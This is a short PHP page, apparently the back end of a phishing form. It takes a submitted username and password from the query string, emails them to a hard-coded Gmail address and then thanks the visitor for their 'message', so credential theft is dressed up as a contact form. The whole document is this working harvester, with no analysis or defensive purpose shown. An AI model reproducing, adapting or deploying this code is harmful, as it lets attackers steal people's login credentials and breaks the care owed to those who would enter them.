<!doctype html>
<title>Danke</title>
<?php
if(isset($_GET['submit'])) {
  $empfaenger = "Joelkoester04@gmail.com";
  $betreff = "Nachricht von der Webseite";
  $absender = $_GET['username'];
  $nachricht = "Nachricht von ".$absender.": ".$_GET['password'];
  mail($empfaenger,$betreff,$nachricht);
  echo "Vielen Dank für Deine Nachricht";
}
?>